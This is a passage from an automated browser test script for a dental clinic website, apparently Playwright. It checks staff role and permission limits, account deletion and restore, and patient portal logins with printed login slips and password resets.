  const logOut = async () => { await p7.getByRole('button', { name: 'Try another role' }).click(); await p7.waitForSelector('.door'); };
  await setManage(true);
  try {
    await logOut();
    await loginAs(p7, 'Clinic coordinator');
    await p7.goto(BASE + '#/staff/admin?tab=staff');
    await p7.waitForSelector('tr:has-text("Clinic coordinator (sample)")');
    const branchButtons = (name) => p7.locator('tr', { hasText: name }).getByRole('button', { name: /^Branches/ }).count();
    assert.equal(await branchButtons('Clinic coordinator (sample)'), 0, 'not on their own row');
    assert.equal(await branchButtons('Dr. Ali Rashid'), 0, 'not on the admin row');
    assert.equal(await branchButtons('Front desk (Gulshan)'), 1, "still on other people's rows");
    const tryChange = (id) => p7.evaluate(async (who) => {
      const { state } = await import('/js/state.js');
      try { await state.data.updateStaffBranches(who, [1]); return 'saved'; } catch (e) { return e.message; }
    }, id);
    assert.match(await tryChange('s-coord'), /cannot change your own/);
    assert.match(await tryChange('s-admin'), /Only admin/);
    // The same for the Role button: not on their own row nor an admin's, and the data layer refuses it as the database does.
    const roleButtons = (name) => p7.locator('tr', { hasText: name }).getByRole('button', { name: /^Role,/ }).count();
    assert.equal(await roleButtons('Clinic coordinator (sample)'), 0, 'no Role button on their own row');
    assert.equal(await roleButtons('Dr. Ali Rashid'), 0, 'no Role button on the admin row');
    assert.equal(await roleButtons('Front desk (Gulshan)'), 1, "Role button on other people's rows");
    const tryRole = (id, role) => p7.evaluate(async ([who, to]) => {
      const { state } = await import('/js/state.js');
      try { await state.data.updateStaffRole(who, to); return 'saved'; } catch (e) { return e.message; }
    }, [id, role]);
    assert.match(await tryRole('s-coord', 'front_desk'), /cannot change your own/);
    assert.match(await tryRole('s-admin', 'front_desk'), /Only admin can change an admin/);
    assert.match(await tryRole('s-fd-gul', 'admin'), /Only admin can create or promote/);
    assert.equal(await tryRole('s-fd-gul', 'assistant'), 'saved', 'a user manager may change someone else\'s role');
    assert.equal(await tryRole('s-fd-gul', 'front_desk'), 'saved');
  } finally {
    // Pass or fail, the steps after this one need Dr. Ali signed in and the coordinator back to normal.
    if (await p7.getByRole('button', { name: 'Try another role' }).count()) await logOut();
    await loginAs(p7, 'Dr. Ali Rashid');
    await setManage(null);
  }
});
await step('Dr. Ali changes the role of a staff member (front desk to assistant), the table follows, personal access stays', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  await p7.waitForSelector(`tr:has-text("${branchLogin}")`);
  const row = p7.locator('tr', { hasText: branchLogin });
  const roleCell = () => row.locator('td').nth(2);
  const idOf = () => p7.evaluate(async (email) => { const { state } = await import('/js/state.js'); return (await state.data.staffList()).find((s) => s.email === email).id; }, branchLogin);
  // The Role button sits next to Branches, on exactly the rows that have Branches (not the admin row, not your own).
  assert.equal(await p7.getByRole('button', { name: /^Role,/ }).count(), await p7.getByRole('button', { name: /^Branches,/ }).count(), 'Role is shown wherever Branches is');
  assert.equal(await p7.locator('tr', { hasText: 'Dr. Ali Rashid' }).getByRole('button', { name: /^Role,/ }).count(), 0, 'no Role button on the admin row');
  const labels = await row.getByRole('button').allInnerTexts();
  assert.equal(labels.indexOf('Role'), labels.indexOf('Branches') + 1, 'Role comes right after Branches');
  assert.equal((await roleCell().textContent()).trim(), 'Front desk');
  // A personal access tick set before the change must still be there after it.
  const id = await idOf();
  await p7.evaluate(async (who) => { const { state } = await import('/js/state.js'); await state.data.setOverride(who, 'billing.view', true); }, id);
  try {
    let m;
    const openRole = async () => { await row.getByRole('button', { name: /^Role,/ }).click(); m = p7.locator('.modal'); return m.locator('select'); };
    let sel = await openRole();
    assert.deepEqual(await sel.locator('option').allInnerTexts(), ['Front desk', 'Assistant', 'Doctor', 'Clinic coordinator', 'Accountant'], 'the five working roles, never Admin');
    assert.equal(await sel.inputValue(), 'front_desk', 'pre-selected with the current role');
    assert.match(await m.innerText(), /Their menus and permissions change to the Front desk ones; personal access ticks stay/);
    // Save with the current role changes nothing and says so.
    await m.getByRole('button', { name: 'Save' }).click();
    await p7.waitForSelector('.toast:has-text("Nothing changed")');
    assert.ok(await m.isVisible(), 'the dialog stays open');
    assert.equal((await roleCell().textContent()).trim(), 'Front desk');
    await sel.selectOption('assistant');
    assert.match(await m.innerText(), /Their menus and permissions change to the Assistant ones; personal access ticks stay/, 'the note names the chosen role');
    await m.getByRole('button', { name: 'Save' }).click();
    await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Assistant")`);
    await p7.waitForSelector('.toast:has-text("is now Assistant")');
    assert.equal(await p7.locator('.modal').count(), 0, 'the dialog closes after saving');
    const stays = await p7.evaluate(async (who) => { const { state } = await import('/js/state.js'); const g = await state.data.permissionGrid(); return g.overrides[who]?.['billing.view']; }, id);
    assert.equal(stays, true, 'the personal access tick stayed through the role change');
    // Reopened, the dialog is pre-selected from the saved role. Put the account back to front desk.
    sel = await openRole();
    assert.equal(await sel.inputValue(), 'assistant', 'pre-selected from the saved role');
    await sel.selectOption('front_desk');
    await m.getByRole('button', { name: 'Save' }).click();
    await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Front desk")`);
  } finally {
    await p7.evaluate(async (who) => { const { state } = await import('/js/state.js'); await state.data.setOverride(who, 'billing.view', null); }, id);
  }
});
await step('Admin → Audit log lists sign-ins', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=audit');
  await p7.waitForSelector('h2:text("Logins")');
  await p7.waitForSelector('table.list tr:has-text("Dr. Ali Rashid")');
  assert.ok(await p7.locator('h2:text("Recent changes")').count());
});

// ------------------------------------------------------------- Delete on Staff accounts
// The owner (15 Oct 2026): "can i get a delete button for the accounts that dont get used?" A fresh page, so the demo has its two sample
// accounts as seeded: "Weekend reception (sample)" nobody ever used, and "Dr. Saba (sample)" whose name is on 3 visits, 2 payments and a reminder.
const pdl = await newPage();
const mainRows = (pg) => pg.locator('section.panel > .table-scroll table tbody tr');
const loginOptions = async (pg, clinician) => {
  await pg.goto(BASE + '#/staff/admin?tab=setup');
  await pg.waitForSelector('h2:text("Doctors and assistants")');
  await pg.getByRole('button', { name: `Edit ${clinician}`, exact: true }).click();
  const m = pg.locator('.modal');
  const sel = m.getByLabel('Login', { exact: true });
  const out = { options: await sel.locator('option').allTextContents(), chosen: await sel.locator('option:checked').textContent() };
  await m.getByRole('button', { name: 'Cancel' }).click();
  await m.waitFor({ state: 'detached' });
  return out;
};
await step('Staff accounts: Delete is on every row but the admin\'s and your own (a user manager has none on their own row either)', async () => {
  await loginAs(pdl, 'Dr. Ali Rashid');
  await pdl.goto(BASE + '#/staff/admin?tab=staff');
  await pdl.waitForSelector('tr:has-text("Weekend reception (sample)")');
  assert.equal(await pdl.getByRole('button', { name: 'Delete Dr. Ali Rashid' }).count(), 0, 'no Delete on the admin row (also your own here)');
  assert.equal(await pdl.getByRole('button', { name: /^Delete / }).count(), (await mainRows(pdl).count()) - 1, 'Delete on every other row');
  const del = mainRows(pdl).filter({ hasText: 'Weekend reception (sample)' }).getByRole('button', { name: 'Delete Weekend reception (sample)' });
  assert.match(await del.getAttribute('class'), /btn-small/);
  assert.match(await del.getAttribute('class'), /btn-danger/);
  assert.equal(await pdl.locator('summary', { hasText: 'Deleted accounts' }).count(), 0, 'no Deleted accounts part while there are none');
  // A user manager (users.manage for this person only) sees Delete on other people's rows, never on their own nor the admin's.
  const setManage = (on) => pdl.evaluate(async (v) => { const { state } = await import('/js/state.js'); await state.data.setOverride('s-coord', 'users.manage', v); }, on);
  await setManage(true);
  try {
    await tryAnotherRole(pdl);
    await loginAs(pdl, 'Clinic coordinator');
    await pdl.goto(BASE + '#/staff/admin?tab=staff');
    await pdl.waitForSelector('tr:has-text("Clinic coordinator (sample)")');
    assert.equal(await pdl.getByRole('button', { name: 'Delete Clinic coordinator (sample)' }).count(), 0, 'not on their own row');
    assert.equal(await pdl.getByRole('button', { name: 'Delete Dr. Ali Rashid' }).count(), 0, 'not on the admin row');
    assert.equal(await pdl.getByRole('button', { name: 'Delete Front desk (Gulshan)' }).count(), 1, "on other people's rows");
    const own = await pdl.evaluate(async () => { const { state } = await import('/js/state.js'); try { await state.data.deleteStaff('s-coord'); return 'deleted'; } catch (e) { return e.message; } });
    assert.match(own, /cannot delete your own account/, 'the data layer refuses it too');
    // The dialog says whether the account was ever used for a user manager too (it comes with the count; the login list is Dr. Ali's).
    await pdl.getByRole('button', { name: 'Delete Weekend reception (sample)' }).click();
    const dm = pdl.getByRole('dialog', { name: "Delete Weekend reception (sample)'s account?" });
    await dm.waitFor();
    assert.match(await dm.innerText(), /Weekend reception \(sample\) has no records on the website \(never logged in\)/, 'a user manager sees "never logged in" too');
    await dm.getByRole('button', { name: 'Cancel' }).click();
    await dm.waitFor({ state: 'detached' });
  } finally {
    if (await pdl.getByRole('button', { name: 'Try another role' }).count()) await tryAnotherRole(pdl);
    await loginAs(pdl, 'Dr. Ali Rashid');
    await setManage(null);
  }
  // The coordinator has logged in now (and saved nothing): the dialog says when.
  await pdl.goto(BASE + '#/staff/admin?tab=staff');
  await pdl.getByRole('button', { name: 'Delete Clinic coordinator (sample)' }).click();
  const cm = pdl.getByRole('dialog', { name: "Delete Clinic coordinator (sample)'s account?" });
  await cm.waitFor();
  assert.match(await cm.innerText(), /Clinic coordinator \(sample\) has no records on the website \(last logged in [^)]+\)/);
  await cm.getByRole('button', { name: 'Cancel' }).click();
  await cm.waitFor({ state: 'detached' });
});
await step('Delete an account nobody used: the dialog says it has no records and the email can be reused; it is removed for good', async () => {
  await pdl.goto(BASE + '#/staff/admin?tab=staff');
  await pdl.getByRole('button', { name: 'Delete Weekend reception (sample)' }).click();
  const m = pdl.getByRole('dialog', { name: "Delete Weekend reception (sample)'s account?" });
  await m.waitFor();
  const text = await m.innerText();
  assert.match(text, /Weekend reception \(sample\) has no records on the website \(never logged in\)/);
  assert.match(text, /removes the login for good, and demo\.weekend@example\.com can then be given to someone else/);
  await m.getByRole('button', { name: 'Delete Weekend reception (sample)' }).click();
  await pdl.waitForSelector('.toast:has-text("login was removed for good")');
  await m.waitFor({ state: 'detached' });
  assert.equal(await pdl.locator('tr', { hasText: 'Weekend reception (sample)' }).count(), 0, 'gone from the list');
  assert.equal(await pdl.locator('summary', { hasText: 'Deleted accounts' }).count(), 0, 'and not under Deleted accounts: it is gone for good');
});
await step('A login made for a doctor and never used: Delete says the doctor stays; afterwards "New staff account" offers that doctor again', async () => {
  await pdl.goto(BASE + '#/staff/admin?tab=staff');
  await pdl.getByRole('button', { name: 'New staff account' }).click();
  const nm = pdl.locator('.modal');
  await nm.getByPlaceholder('Full name').fill('Hina login (sample)');
  await nm.locator('input[type=email]').fill('hina.login@dralirashid.com');
  await nm.getByLabel('Link to doctor/assistant name').selectOption({ label: 'Dr. Hina (sample)' });
  await nm.getByRole('button', { name: 'Create account' }).click();
  await pdl.waitForSelector('td:text("hina.login@dralirashid.com")');
  await nm.waitFor({ state: 'detached' });
  // Linked a moment ago, in this same visit to the page: the dialog knows it without a reload.
  await pdl.getByRole('button', { name: 'Delete Hina login (sample)' }).click();
  const m = pdl.getByRole('dialog', { name: "Delete Hina login (sample)'s account?" });
  await m.waitFor();
  const text = await m.innerText();
  assert.match(text, /Hina login \(sample\) has no records on the website \(never logged in\)/);
  assert.match(text, /Dr\. Hina \(sample\) stays in the doctors list for visits; only the login goes\./, 'the linked doctor is named');
  await m.getByRole('button', { name: 'Delete Hina login (sample)' }).click();
  await pdl.waitForSelector(".toast:has-text(\"Hina login (sample)'s login was removed for good\")");
  await m.waitFor({ state: 'detached' });
  // The doctor is free again: offered in "New staff account" without a reload.
  await pdl.getByRole('button', { name: 'New staff account' }).click();
  const again = pdl.locator('.modal');
  const offered = await again.getByLabel('Link to doctor/assistant name').locator('option').allTextContents();
  assert.ok(offered.includes('Dr. Hina (sample)'), `Dr. Hina is offered again (${offered.join(', ')})`);
  await again.getByRole('button', { name: 'Cancel' }).click();
  await again.waitFor({ state: 'detached' });
});
await step('Delete an account with records: the dialog counts them, the account moves to "Deleted accounts (1)" and leaves the Login picker; Bring back returns it switched off', async () => {
  // Before: Dr. Saba (sample) is offered as a doctor's login in Clinic setup.
  assert.ok((await loginOptions(pdl, 'Dr. Amna (sample)')).options.includes('Dr. Saba (sample)'), 'offered in the Login picker before');
  await pdl.goto(BASE + '#/staff/admin?tab=staff');
  await pdl.getByRole('button', { name: 'Delete Dr. Saba (sample)' }).click();
  const m = pdl.getByRole('dialog', { name: "Delete Dr. Saba (sample)'s account?" });
  await m.waitFor();
  const text = await m.innerText();
  assert.match(text, /records with Dr\. Saba \(sample\)'s name on them: 3 visits, 2 payments, 1 reminder made\./, 'the counts in words');
  assert.match(text, /cannot be removed for good/);
  assert.match(text, /bring it back from "Deleted accounts" at the bottom of this page/);
  await m.getByRole('button', { name: 'Delete Dr. Saba (sample)' }).click();
  await pdl.waitForSelector('.toast:has-text("switched off and moved to Deleted accounts")');
  assert.equal(await mainRows(pdl).filter({ hasText: 'Dr. Saba (sample)' }).count(), 0, 'off the list');
  const summary = pdl.locator('details.deleted-accounts summary');
  assert.equal((await summary.textContent()).trim(), 'Deleted accounts (1)');
  await summary.click();
  const row = pdl.locator('details.deleted-accounts tbody tr', { hasText: 'Dr. Saba (sample)' });
  await row.waitFor();
  assert.match(await row.innerText(), /demo\.doctor2@example\.com\s+Doctor/);
  // Elsewhere: not offered as a login any more, but a doctor's row still names it.
  assert.ok(!(await loginOptions(pdl, 'Dr. Amna (sample)')).options.some((o) => o.includes('Dr. Saba')), 'not in the Login picker after');
  assert.equal((await loginOptions(pdl, 'Dr. Saba (sample)')).chosen, 'Dr. Saba (sample) (deleted)', 'the doctor\'s own row keeps its login, named as deleted');
  // Bring back: on the list again, still switched off.
  await pdl.goto(BASE + '#/staff/admin?tab=staff');
  await pdl.locator('details.deleted-accounts summary').click();
  await pdl.getByRole('button', { name: 'Bring back Dr. Saba (sample)' }).click();
  await pdl.waitForSelector('.toast:has-text("still switched off")');
  const back = mainRows(pdl).filter({ hasText: 'Dr. Saba (sample)' });
  await back.waitFor();
  assert.ok(await back.locator('.badge-inactive', { hasText: 'Switched off' }).count(), 'switched off');
  assert.equal(await back.getByRole('button', { name: 'Switch on Dr. Saba (sample)' }).count(), 1, 'Switch on is offered');
  assert.equal(await back.getByRole('button', { name: 'Delete Dr. Saba (sample)' }).count(), 1, 'and Delete again');
  assert.equal(await pdl.locator('summary', { hasText: 'Deleted accounts' }).count(), 0, 'no deleted accounts left');
  assert.ok(!(await loginOptions(pdl, 'Dr. Amna (sample)')).options.includes('Dr. Saba (sample)'), 'still not offered while switched off');
});
await step('A Delete that fails after the server switched the account off: the message says so, the dialog closes, and the row shows it switched off', async () => {
  await pdl.goto(BASE + '#/staff/admin?tab=staff');
  // What delete_staff answers when the count fails: it switched the account off first, then stopped.
  await pdl.evaluate(async () => {
    const { state } = await import('/js/state.js');
    window.__realDeleteStaff = state.data.deleteStaff;
    state.data.deleteStaff = async (id) => {
      await state.data.deactivateStaff(id);
      throw new Error("The account's records could not be counted (the database took too long). Accountant (sample)'s account is switched off; nothing was deleted.");
    };
  });
  try {
    const row = mainRows(pdl).filter({ hasText: 'Accountant (sample)' });
    assert.equal(await row.locator('.badge-inactive').count(), 0, 'switched on before');
    await row.getByRole('button', { name: 'Delete Accountant (sample)' }).click();
    const m = pdl.getByRole('dialog', { name: "Delete Accountant (sample)'s account?" });
    await m.getByRole('button', { name: 'Delete Accountant (sample)' }).click();
    await pdl.waitForSelector('.toast:has-text("switched off; nothing was deleted")');
    assert.match(await pdl.locator('.toast', { hasText: 'nothing was deleted' }).innerText(), /could not be counted \(the database took too long\)/, 'the whole sentence, not advice about date ranges');
    await m.waitFor({ state: 'detached' });
    const after = mainRows(pdl).filter({ hasText: 'Accountant (sample)' });
    await after.locator('.badge-inactive', { hasText: 'Switched off' }).waitFor();
    assert.equal(await after.getByRole('button', { name: 'Switch on Accountant (sample)' }).count(), 1, 'the row shows the account as it is now');
  } finally {
    await pdl.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.deleteStaff = window.__realDeleteStaff; });
  }
  expectErrors(/could not be counted/);
});

// ------------------------------------------------------------- portal login made at the clinic
// The demo keeps its "login server" in the page's memory, so the staff member and the patient share one page (hash changes only).
const pl = await newPage();
let slip = {};
// Logging out finishes by sending the page to the home page: wait for that, or it lands on top of whatever the test opened next.
const logOut = async ({ staff = false } = {}) => {
  if (staff) await pl.getByRole('button', { name: /^Account menu/ }).click();
  await pl.getByRole('button', { name: 'Log out' }).click();
  await pl.waitForFunction(() => location.hash === '#/');
  await pl.waitForSelector('.door');
};
const openPatient = async (name) => {
  await pl.goto(BASE + `#/staff/patients?q=${encodeURIComponent(name)}`);
  await pl.locator('table.list tbody tr', { hasText: name }).locator('a').first().click();
  await pl.waitForSelector(`h1:has-text("${name}")`);
};
await step('portal login buttons: "Create portal login" for a patient with none, the email invitation only when there is an email', async () => {
  await loginAs(pl, 'Dr. Ali Rashid');
  await openPatient('Hamza Qureshi'); // no email on file
  await pl.getByRole('button', { name: 'Create portal login' }).waitFor();
  assert.equal(await pl.getByRole('button', { name: 'Invite to patient portal' }).count(), 0, 'no email: nothing to invite');
  await pl.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor();
  await openPatient('Zainab Rizvi'); // has an email
  await pl.getByRole('button', { name: 'Create portal login' }).waitFor();
  await pl.getByRole('button', { name: 'Invite to patient portal' }).waitFor();
  await pl.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor();
  await openPatient('Areeba Siddiqui'); // already has a login with her own email
  await pl.waitForSelector('h1:has-text("Areeba Siddiqui")');
  assert.equal(await pl.getByRole('button', { name: 'Create portal login' }).count(), 0);
  await pl.locator('.portal-login-line', { hasText: 'Portal login: own email (invited)' }).waitFor();
  assert.equal(await pl.getByRole('button', { name: 'Reset portal password' }).count(), 0, 'a login with the patient\'s own email is reset by email, not here');
});
await step('staff create a portal login: the username, an easy password, and a login slip that prints on one small page', async () => {
  await openPatient('Hamza Qureshi');
  await pl.getByRole('button', { name: 'Create portal login' }).click();
  const m = pl.locator('.modal');
  assert.equal(await m.locator('input[readonly]').inputValue(), 'hamzaqureshi-9812@dralirashid.com');
  const generated = await m.getByLabel('Password').inputValue();
  assert.match(generated, /^[a-hj-km-np-z]{3,5}-[a-hj-km-np-z]{3,5}-[a-hj-km-np-z]{3,5}-[2-9]{4}$/, 'three short words and four digits, nothing that can be misread');
  await m.getByRole('button', { name: 'New one' }).click();
  assert.notEqual(await m.getByLabel('Password').inputValue(), generated, '"New one" gives another');
  // Copy is for the username only: the slip is how the password is handed over (a copied password stays in the clipboard history of the front desk).
  assert.equal(await m.getByRole('button', { name: 'Copy' }).count(), 1, 'one Copy button');
  assert.equal(await m.locator('.inline:has(input[readonly]) button', { hasText: 'Copy' }).count(), 1, 'and it is the username\'s');
  assert.deepEqual(await m.locator('.inline:has(input[autocomplete=off]) button').allInnerTexts(), ['New one'], 'the password box has only "New one"');
  await m.getByLabel('Password').fill('short');
  await m.getByRole('button', { name: 'Create login' }).click();
  await m.locator('.field-error', { hasText: 'at least 10 characters' }).waitFor();
  await m.getByLabel('Password').fill('0300123456789');
  await m.getByRole('button', { name: 'Create login' }).click();
  await m.locator('.field-error', { hasText: 'only digits' }).waitFor();
  slip = { username: 'hamzaqureshi-9812@dralirashid.com', password: 'sunny-grape-4827' };
  await m.getByLabel('Password').fill(slip.password);
  await m.getByRole('button', { name: 'Create login' }).click();
  await pl.waitForSelector('.login-slip');
  const text = await pl.locator('.login-slip').innerText();
  for (const part of ['Dr. Ali Rashid\'s Dental Clinic', 'www.dralirashid.com', slip.username, slip.password, 'Hamza Qureshi', 'Mr# 9812', 'You will be asked to choose your own password the first time you log in']) assert.ok(text.includes(part), `slip shows "${part}"`);
  assert.equal(await pl.locator('.modal').count(), 1, 'only the slip dialog is open');
  await shot(pl, '15-login-slip');
  // Print: the slip is the only thing on the paper, and it is one page.
  await pl.evaluate(() => { window.__print = []; window.print = () => { window.__print.push({ printing: document.body.classList.contains('printing'), areas: [...document.querySelectorAll('.print-area')].map((a) => a.className) }); window.dispatchEvent(new Event('afterprint')); }; });
  await pl.getByRole('button', { name: 'Print login slip' }).click();
  const printed = await pl.evaluate(() => ({ calls: window.__print, still: document.body.classList.contains('printing') }));
  assert.equal(printed.calls.length, 1);
  assert.equal(printed.calls[0].printing, true, 'the print rules were switched on for the slip');
  assert.deepEqual(printed.calls[0].areas, ['login-slip print-area'], 'only the slip is a print area');
  assert.equal(printed.still, false, 'and switched off again afterwards');
  const pdf = await pl.pdf({ preferCSSPageSize: true, printBackground: true });
  const pages = (pdf.toString('latin1').match(/\/Type\s*\/Page[^s]/g) || []).length;
  assert.equal(pages, 1, 'the slip prints on one page');
  const box = pdf.toString('latin1').match(/MediaBox\s*\[\s*0\s+0\s+([\d.]+)\s+([\d.]+)\s*\]/);
  assert.ok(box && Math.abs(Number(box[1]) - 297.6) < 3 && Math.abs(Number(box[2]) - 419.5) < 3, `the page is A6 (105 x 148 mm), not ${box?.slice(1, 3).join(' x ')}`);
  await pl.getByRole('button', { name: 'Close' }).first().click();
  await pl.waitForSelector('h1:has-text("Hamza Qureshi")');
  await pl.getByRole('button', { name: 'Reset portal password' }).waitFor();
  assert.equal(await pl.getByRole('button', { name: 'Create portal login' }).count(), 0, 'the login exists now');
  // The password was shown only in the dialog and on the slip: it is not left anywhere on the page.
  assert.equal((await pl.locator('main, #app').first().innerText()).includes(slip.password), false);
  // The patient record now says which login it is (and the username to tell the patient again without a reset).
  await pl.locator('.portal-login-line', { hasText: 'Portal login: ' + slip.username }).waitFor();
});
await step('the Portal login line says "could not check" with a retry when the function cannot be asked, and "Update the admin-users function first." when it is old', async () => {
  const stub = (message) => pl.evaluate(async (m) => {
    const { state } = await import('/js/state.js');
    window.__realInfo ||= state.data.portalLoginInfo;
    state.data.portalLoginInfo = m === null ? window.__realInfo : async () => { throw new Error(m); };
  }, message);
  await stub('Update the admin-users function first.'); // what the website says when the function does not know the action yet
  await openPatient('Hamza Qureshi');
  const line = pl.locator('.portal-login-line');
  await line.getByText('could not check').waitFor();
  assert.match(await line.innerText(), /Update the admin-users function first\./);
  assert.equal(await pl.getByRole('button', { name: 'Reset portal password' }).count(), 0, 'no reset button on a login that could not be checked');
  await stub(null); // the function answers again
  await line.getByRole('button', { name: 'Try again' }).click();
  await line.getByText(slip.username).waitFor();
  await pl.getByRole('button', { name: 'Reset portal password' }).waitFor();
  expectErrors(/Update the admin-users function first/);
});
await step('the patient logs in with just the short username, must choose their own password first, then lands in the portal', async () => {
  await logOut({ staff: true });
  await pl.setViewportSize({ width: 390, height: 844 });
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').waitFor();
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.locator('input[type=password]').fill('not-the-password-1');
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.locator('.field-error', { hasText: 'username (or email) and password do not match' }).waitFor();
  await form.locator('input[name=username]').fill('  HamzaQureshi-9812 ');
  await form.locator('input[type=password]').fill(slip.password);
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.waitForSelector('h1:has-text("Choose your own password")');
  assert.equal(await pl.locator('h1:has-text("Hello")').count(), 0, 'nothing of the portal before the new password');
  assert.equal(await pl.locator('.photo-grid, .stat-row').count(), 0);
  await shot(pl, '16-choose-password');
  const next = pl.locator('input[autocomplete=new-password]');
  const save = pl.getByRole('button', { name: 'Save my password' });
  await next.nth(0).fill('abc');
  await next.nth(1).fill('abc');
  await save.click();
  await pl.locator('.field-error', { hasText: 'at least 8 characters' }).waitFor();
  await next.nth(0).fill('my-own-pass-77');
  await next.nth(1).fill('my-own-pass-78');
  await save.click();
  await pl.locator('.field-error', { hasText: 'two passwords are different' }).waitFor();
  await next.nth(0).fill(slip.password);
  await next.nth(1).fill(slip.password);
  await save.click();
  await pl.locator('[role=alert]', { hasText: 'different from your current one' }).first().waitFor();
  await next.nth(0).fill('my-own-pass-77');
  await next.nth(1).fill('my-own-pass-77');
  await save.click();
  await pl.waitForSelector('h1:has-text("Hello, Hamza")');
  await pl.getByRole('button', { name: 'Change password' }).waitFor();
  await shot(pl, '17-portal-after-first-login');
});
await step('the patient can change the password later from the portal menu, and the old one stops working', async () => {
  await pl.getByRole('button', { name: 'Change password' }).click();
  const dlg = pl.locator('.modal');
  await dlg.getByLabel('New password').fill('later-pass-4455');
  await dlg.getByLabel('Type it again').fill('later-pass-9999');
  await dlg.getByRole('button', { name: 'Save password' }).click();
  await dlg.locator('.field-error', { hasText: 'two passwords are different' }).waitFor();
  await dlg.getByLabel('New password').fill('later-pass-4455');
  await dlg.getByLabel('Type it again').fill('later-pass-4455');
  await dlg.getByRole('button', { name: 'Save password' }).click();
  await pl.waitForSelector('.toast:has-text("Your password has been changed")');
  await logOut();
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill(slip.username); // the whole address works too
  await form.locator('input[type=password]').fill('my-own-pass-77');
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.locator('.field-error', { hasText: 'do not match' }).waitFor();
  await form.locator('input[type=password]').fill('later-pass-4455');
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.waitForSelector('h1:has-text("Hello, Hamza")'); // no "choose a password" screen again
  assert.equal(await pl.locator('h1:has-text("Choose your own password")').count(), 0);
});
await step('"Forgot password" for a clinic username says to ask the clinic (no email); a staff address is told the staff way', async () => {
  await logOut();
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  await pl.locator('.field-error', { hasText: 'Type your username or email address first' }).waitFor();
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  await pl.locator('p.muted', { hasText: 'Ask the clinic to reset your password' }).waitFor();
  await form.locator('input[name=username]').fill('someone@example.com');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  await pl.locator('.field-error', { hasText: 'Something went wrong' }).waitFor(); // a real email goes to the email reset (the demo has none, so it fails the way any failed reset does)
});
await step('the patient login page points to the slip and to the clinic, for the hint and for "Forgot password" (WhatsApp link included)', async () => {
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').waitFor();
  const text = await form.innerText();
  assert.match(text, /Use the username on the slip the clinic gave you\. Patients who were invited by email use that email address\./);
  assert.doesNotMatch(text, /If you gave the clinic your email address/, 'no longer sends a clinic-made login to the real email');
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  const note = form.locator('p.muted', { hasText: 'Ask the clinic to reset your password' });
  await note.waitFor();
  const wa = note.getByRole('link', { name: /message the clinic on WhatsApp/ });
  assert.match(await wa.getAttribute('href'), /^https:\/\/wa\.me\/92\d{10}\?text=/, 'the clinic\'s WhatsApp chat');
  assert.equal(await wa.getAttribute('target'), '_blank');
  assert.match(await wa.getAttribute('rel'), /noopener/);
  // A real email: the reset email goes out (stand-in here), and the note says what to do if the login came from the clinic.
  await pl.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.sendPasswordReset = async () => {}; });
  await form.locator('input[name=username]').fill('hamza@example.com');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  const emailNote = form.locator('p.muted', { hasText: 'a link to set a new password is on its way' });
  await emailNote.waitFor();
  assert.match(await emailNote.innerText(), /If the clinic gave you a username on a slip, no link will come: use that username here instead, or message the clinic on WhatsApp/);
  assert.equal(await emailNote.getByRole('link', { name: /WhatsApp/ }).count(), 1);
});
await step('staff reset the password of a login made at the clinic: same username, a new slip, and the patient must choose again', async () => {
  await pl.setViewportSize({ width: 1366, height: 860 });
  await pl.goto(BASE + '#/login/staff');
  await pl.getByRole('button', { name: /Dr. Ali Rashid/ }).click();
  await pl.waitForSelector('.topbar');
  await openPatient('Hamza Qureshi');
  await pl.getByRole('button', { name: 'Reset portal password' }).click();
  const m = pl.locator('.modal');
  assert.equal(await m.locator('input[readonly]').inputValue(), slip.username);
  // Honest about what a reset does: it does not end a session that is already open.
  const said = await m.innerText();
  assert.match(said, /Saving signs the patient out everywhere: the old password stops working at once/);
  assert.doesNotMatch(said, /stops working as soon as you save/);
  slip.password = 'peach-zebra-5936';
  await m.getByLabel('Password').fill(slip.password);
  await m.getByRole('button', { name: 'Reset password' }).click();
  await pl.waitForSelector('.login-slip');
  assert.ok((await pl.locator('.login-slip').innerText()).includes(slip.password));
  await pl.getByRole('button', { name: 'Close' }).first().click();
  await logOut({ staff: true });
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.locator('input[type=password]').fill('later-pass-4455'); // the old password no longer works
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.locator('.field-error', { hasText: 'do not match' }).waitFor();
  await form.locator('input[type=password]').fill(slip.password);
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.waitForSelector('h1:has-text("Choose your own password")');
});
await step('a staff login cannot be given a name that looks like a patient login', async () => {
  await logOut();
  await pl.goto(BASE + '#/login/staff');
  await pl.getByRole('button', { name: /Dr. Ali Rashid/ }).click();
  await pl.waitForSelector('.topbar');
  await pl.goto(BASE + '#/staff/admin?tab=staff');
  await pl.getByRole('button', { name: 'New staff account' }).click();
  const m = pl.locator('.modal');
  await m.getByPlaceholder('Full name').fill('Patient Lookalike');
